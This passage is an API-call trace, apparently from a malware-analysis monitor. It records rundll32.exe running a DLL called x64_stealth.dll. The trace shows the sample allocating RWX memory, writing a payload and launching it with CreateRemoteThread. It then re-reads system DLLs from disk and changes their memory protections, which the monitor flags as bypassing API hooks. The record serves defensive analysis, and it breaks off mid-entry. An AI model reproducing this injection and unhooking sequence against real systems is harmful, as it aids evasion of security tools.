+[PAR] LPCSTR  lpProcName : 0x00000002E4D562CC ("OutputDebugStringA")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [151]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D562E2 ("SetLastError")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [152]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D562F2 ("Sleep")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [153]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D562FA ("TlsGetValue")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [154]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D56308 ("VirtualAllocEx")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [155]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D5631A ("VirtualProtect")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [156]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D5632C ("VirtualQuery")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [157]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D5633C ("WaitForSingleObject")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [158]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D56352 ("WriteProcessMemory")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [159]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <IsBadReadPtr> in [KERNEL32.DLL] 
+[PAR] CONST VOID* lp  : 0x00000002E4D56014
+[PAR] UINT_PTR    ucb : 0x14
+[RET] [0xe040021d14] in [rundll32.exe]
+
+[CNT] [160]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <LoadLibraryA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpFileName : 0x00000002E4D5648C ("msvcrt.dll")
+[RET] 0xe040021fd9
+
+[CNT] [161]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualQuery> in [KERNEL32.DLL] 
+[PAR] LPCVOID                   lpAddress : 0x000000E03FD00000
+[PAR] PMEMORY_BASIC_INFORMATION lpBuffer  : 0x000000E03FBAF280
+[PAR] SIZE_T                    dwLength  : 0x30
+[RET] [0xe04002109b] in [rundll32.exe]
+
+[CNT] [162]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00BA0000 ("msvcrt.dll")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D56368 ("__iob_func")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [163]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00BA0000 ("msvcrt.dll")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D56376 ("_amsg_exit")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [164]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00BA0000 ("msvcrt.dll")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D56384 ("_initterm")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [165]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00BA0000 ("msvcrt.dll")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D56390 ("_lock")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [166]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00BA0000 ("msvcrt.dll")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D56398 ("_unlock")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [167]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00BA0000 ("msvcrt.dll")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D563A2 ("_wcsnicmp")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [168]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00BA0000 ("msvcrt.dll")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D563AE ("abort")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [169]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00BA0000 ("msvcrt.dll")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D563B6 ("calloc")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [170]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00BA0000 ("msvcrt.dll")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D563C0 ("exit")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [171]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00BA0000 ("msvcrt.dll")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D563C8 ("free")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [172]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00BA0000 ("msvcrt.dll")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D563D0 ("fwrite")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [173]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00BA0000 ("msvcrt.dll")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D563DA ("realloc")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [174]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00BA0000 ("msvcrt.dll")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D563E4 ("strlen")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [175]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00BA0000 ("msvcrt.dll")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D563EE ("strncmp")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [176]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00BA0000 ("msvcrt.dll")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D563F8 ("vfprintf")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [177]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <IsBadReadPtr> in [KERNEL32.DLL] 
+[PAR] CONST VOID* lp  : 0x00000002E4D56028
+[PAR] UINT_PTR    ucb : 0x14
+[RET] [0xe040021d14] in [rundll32.exe]
+
+[CNT] [178]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualProtect> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000002E4D11000
+[PAR] SIZE_T dwSize       : 0x49200
+[PAR] DWORD  flNewProtect : 0x40 (PAGE_EXECUTE_READWRITE)
+[RET] [0xe040021777] in [rundll32.exe]
+
+[CNT] [179]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <_initterm> in [msvcrt.dll] 
+[RET] [0x2e4d11199]
+
+[CNT] [180]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <_initterm> in [msvcrt.dll] 
+[RET] [0x2e4d111b3]
+
+[CNT] [181]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <_lock> in [msvcrt.dll] 
+[RET] [0x2e4d12941]
+
+[CNT] [182]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <calloc> in [msvcrt.dll] 
+[RET] [0x2e4d129bf]
+
+[CNT] [183]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <_unlock> in [msvcrt.dll] 
+[RET] [0x2e4d12969]
+
+[CNT] [184]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <Sleep> in [KERNEL32.DLL] 
+[PAR] DWORD dwMilliseconds : 0x0 (0 sec)
+[RET] [0x2e4d113a6]
+
+[CNT] [185]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAllocEx> in [KERNEL32.DLL] 
+[PAR] HANDLE hProcess     : 0xffffffff
+[PAR] LPVOID lpAddress    : 0x0
+[PAR] SIZE_T dwSize       : 0x3dbbf
+[PAR] DWORD  flProtect    : 0x40 (PAGE_EXECUTE_READWRITE)
+[RET] [0x2e4d113c9]
+
+[ * ] [pid 0xa6c][tid 0xb3c] c:\windows\system32\rundll32.exe
+[API] <VirtualAllocEx>
+[RES] LPVOID  0x000000E0400B0000
+
+[CNT] [186]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <WriteProcessMemory> in [KERNEL32.DLL] 
+[PAR] HANDLE  hProcess      : 0xffffffff
+[PAR] LPVOID  lpBaseAddress : 0x000000E0400B0000
+[PAR] LPCVOID lpBuffer      : 0x00000002E4D13010
+[PAR] SIZE_T  nSize         : 0x3dbbf
+[RET] [0x2e4d113fe]
+
+[CNT] [187]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <CreateRemoteThread> in [KERNEL32.DLL] 
+[PAR] HANDLE                 hProcess           : 0xffffffff
+[PAR] LPSECURITY_ATTRIBUTES  lpThreadAttributes : 0x0
+[PAR] SIZE_T                 dwStackSize        : 0x0
+[PAR] LPTHREAD_START_ROUTINE lpStartAddress     : 0x00000002E4D11370
+[PAR] LPVOID                 lpParameter        : 0x000000E0400B0000
+[PAR] DWORD                  dwCreationFlags    : 0x0
+[PAR] LPDWORD                lpThreadId         : 0x0
+[RET] [0x2e4d11434]
+
+Thread created by monitored process : Now monitoring [pid 0xa6c][tid 0xad0]
+
+[CNT] [188]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <Sleep> in [KERNEL32.DLL] 
+[PAR] DWORD dwMilliseconds : 0xea60 (60 sec)
+[RET] [0x2e4d11527]
+
+[CNT] [189]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x0000000180102798 ("FlsGetValue")
+[RET] [0x1800b281e] in [x64_stealth.dll]
+
+[CNT] [190]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[API] <LdrGetDllHandleEx> in [ntdll.dll] 
+[PAR] ULONG           Flags              : 0x1 (LDR_GET_DLL_HANDLE_EX_UNCHANGED_REFCOUNT)
+[PAR] PCWSTR          DllPath            : 0x0
+[PAR] PULONG          DllCharacteristics : 0x0
+[PAR] PUNICODE_STRING ModuleFileName     : 0x000000E041C4FB40 ("C:\Windows\system32\KERNEL32.DLL")
+[PAR] PVOID*          DllHandle          : 0x000000E041C4FC58
+[RET] [0xe0400ed210]
+
+[CNT] [191]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[API] <LdrGetDllHandleEx> in [ntdll.dll] 
+[PAR] ULONG           Flags              : 0x1 (LDR_GET_DLL_HANDLE_EX_UNCHANGED_REFCOUNT)
+[PAR] PCWSTR          DllPath            : 0x0
+[PAR] PULONG          DllCharacteristics : 0x0
+[PAR] PUNICODE_STRING ModuleFileName     : 0x000000E041C4FAE0 ("C:\Windows\system32\KERNELBASE.dll")
+[PAR] PVOID*          DllHandle          : 0x000000E041C4FC60
+[RET] [0xe0400ed898]
+
+[CNT] [192]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtOpenFile> in [ntdll.dll] 
+[PAR] PHANDLE            FileHandle       : 0x000000E041C4F9C0
+[PAR] ACCESS_MASK        DesiredAccess    : 0x120089 (FILE_GENERIC_READ)
+[PAR] POBJECT_ATTRIBUTES ObjectAttributes : 0x000000E041C4FA30
+[FLD]                    -> ObjectName = "\??\C:\Windows\SYSTEM32\ntdll.dll"
+[PAR] PIO_STATUS_BLOCK  IoStatusBlock     : 0x000000E041C4FA10
+[PAR] ULONG             ShareAccess       : 0x1 (FILE_SHARE_READ)
+[PAR] ULONG             OpenOptions       : 0x60
+[RET] [0xe0400eda67]
+
+[CNT] [193]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtReadFile> in [ntdll.dll] 
+[PAR] HANDLE           FileHandle      : 0x108
+[PAR] HANDLE           Event           : 0x0
+[PAR] PIO_APC_ROUTINE  ApcRoutine      : 0x0
+[PAR] PVOID            ApcContext      : 0x0
+[PAR] PIO_STATUS_BLOCK IoStatusBlock   : 0x000000E041C4FA20
+[PAR] PVOID            Buffer          : 0x000000E041C58040
+[PAR] ULONG            Length          : 0x1ac000
+[PAR] PLARGE_INTEGER   ByteOffset      : 0x000000E041C4F9C8
+[PAR] PULONG           Key             : 0x0
+[RET] [0xe0400edb8e]
+
+[CNT] [194]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4F9D0 (0x00007FFA03601000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4F9D8 (0x12a880)
+[PAR] ULONG  NewAccessProtection    : 0x40 (PAGE_EXECUTE_READWRITE)
+[RET] [0xe0400edac3]
+
+[CNT] [195]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4F9D0 (0x00007FFA03601000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4F9D8 (0x12b000)
+[PAR] ULONG  NewAccessProtection    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400edac3]
+
+[CNT] [196]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4F9E0 (0x00007FFA0371AE40)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4F9E8 (0x10a40)
+[PAR] ULONG  NewAccessProtection    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400edac3]
+
+[CNT] [197]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4F9E0 (0x00007FFA0371A000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4F9E8 (0x12000)
+[PAR] ULONG  NewAccessProtection    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400edac3]
+
+[CNT] [198]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtFlushInstructionCache> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  BaseAddress   : 0x0
+[PAR] SIZE_T Length        : 0x0
+[RET] [0xe0400ed953]
+
+[CNT] [199]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtOpenFile> in [ntdll.dll] 
+[PAR] PHANDLE            FileHandle       : 0x000000E041C4F9C0
+[PAR] ACCESS_MASK        DesiredAccess    : 0x120089 (FILE_GENERIC_READ)
+[PAR] POBJECT_ATTRIBUTES ObjectAttributes : 0x000000E041C4FA30
+[FLD]                    -> ObjectName = "\??\C:\Windows\system32\KERNEL32.DLL"
+[PAR] PIO_STATUS_BLOCK  IoStatusBlock     : 0x000000E041C4FA10
+[PAR] ULONG             ShareAccess       : 0x1 (FILE_SHARE_READ)
+[PAR] ULONG             OpenOptions       : 0x60
+[RET] [0xe0400eda67]
+
+[CNT] [200]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtReadFile> in [ntdll.dll] 
+[PAR] HANDLE           FileHandle      : 0x10c
+[PAR] HANDLE           Event           : 0x0
+[PAR] PIO_APC_ROUTINE  ApcRoutine      : 0x0
+[PAR] PVOID            ApcContext      : 0x0
+[PAR] PIO_STATUS_BLOCK IoStatusBlock   : 0x000000E041C4FA20
+[PAR] PVOID            Buffer          : 0x000000E041C55040
+[PAR] ULONG            Length          : 0x13e000
+[PAR] PLARGE_INTEGER   ByteOffset      : 0x000000E041C4F9C8
+[PAR] PULONG           Key             : 0x0
+[RET] [0xe0400edb8e]
+
+[CNT] [201]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4F9D0 (0x00007FFA037B1000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4F9D8 (0x116f60)
+[PAR] ULONG  NewAccessProtection    : 0x40 (PAGE_EXECUTE_READWRITE)
+[RET] [0xe0400edac3]
+
+[CNT] [202]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4F9D0 (0x00007FFA037B1000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4F9D8 (0x117000)
+[PAR] ULONG  NewAccessProtection    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400edac3]
+
+[CNT] [203]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4F9E0 (0x00007FFA037D2DF8)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4F9E8 (0xcfad)
+[PAR] ULONG  NewAccessProtection    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400edac3]
+
+[CNT] [204]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4F9E0 (0x00007FFA037D2000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4F9E8 (0xe000)
+[PAR] ULONG  NewAccessProtection    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400edac3]
+
+[CNT] [205]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtOpenFile> in [ntdll.dll] 
+[PAR] PHANDLE            FileHandle       : 0x000000E041C4F9C0
+[PAR] ACCESS_MASK        DesiredAccess    : 0x120089 (FILE_GENERIC_READ)
+[PAR] POBJECT_ATTRIBUTES ObjectAttributes : 0x000000E041C4FA30
+[FLD]                    -> ObjectName = "\??\C:\Windows\system32\KERNELBASE.dll"
+[PAR] PIO_STATUS_BLOCK  IoStatusBlock     : 0x000000E041C4FA10
+[PAR] ULONG             ShareAccess       : 0x1 (FILE_SHARE_READ)
+[PAR] ULONG             OpenOptions       : 0x60
+[RET] [0xe0400eda67]
+
+[CNT] [206]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtReadFile> in [ntdll.dll] 
+[PAR] HANDLE           FileHandle      : 0x110
+[PAR] HANDLE           Event           : 0x0
+[PAR] PIO_APC_ROUTINE  ApcRoutine      : 0x0
+[PAR] PVOID            ApcContext      : 0x0
+[PAR] PIO_STATUS_BLOCK IoStatusBlock   : 0x000000E041C4FA20
+[PAR] PVOID            Buffer          : 0x000000E041C56040
+[PAR] ULONG            Length          : 0x115000
+[PAR] PLARGE_INTEGER   ByteOffset      : 0x000000E041C4F9C8
+[PAR] PULONG           Key             : 0x0
+[RET] [0xe0400edb8e]
+
+[CNT] [207]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4F9D0 (0x00007FFA038F1000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4F9D8 (0xf1030)
+[PAR] ULONG  NewAccessProtection    : 0x40 (PAGE_EXECUTE_READWRITE)
+[RET] [0xe0400edac3]
+
+[CNT] [208]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4F9D0 (0x00007FFA038F1000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4F9D8 (0xf2000)
+[PAR] ULONG  NewAccessProtection    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400edac3]
+
+[CNT] [209]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4F9E0 (0x00007FFA03956190)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4F9E8 (0xbf11)
+[PAR] ULONG  NewAccessProtection    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400edac3]
+
+[CNT] [210]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4F9E0 (0x00007FFA03956000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4F9E8 (0xd000)
+[PAR] ULONG  NewAccessProtection    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400edac3]
+
+[CNT] [211]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtFlushInstructionCache> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  BaseAddress   : 0x0
+[PAR] SIZE_T Length        : 0x0
+[RET] [0xe0400ed97b]
+
+[CNT] [212]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtAllocateVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE    ProcessHandle  : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID     *BaseAddress   : 0x000000E041C4FA20
+[PAR] ULONG_PTR ZeroBits       : 0x0
+[PAR] PSIZE_T   RegionSize     : 0x000000E041C4FA28
+[PAR] ULONG     AllocationType : 0x3000 (MEM_COMMIT | MEM_RESERVE)
+[PAR] ULONG     Protect        : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400ed9f7]
+
+[CNT] [213]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4FA30 (0x000000E041C51000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4FA38 (0x346e0)
+[PAR] ULONG  NewAccessProtection    : 0x20 (PAGE_EXECUTE_READ)
+[RET] [0xe0400edac3]
+
+[CNT] [214]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4FA30 (0x000000E041C86000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4FA38 (0x1d20)
+[PAR] ULONG  NewAccessProtection    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400edac3]
+
+[CNT] [215]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E041C4FA30 (0x000000E041C88000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E041C4FA38 (0x1770)
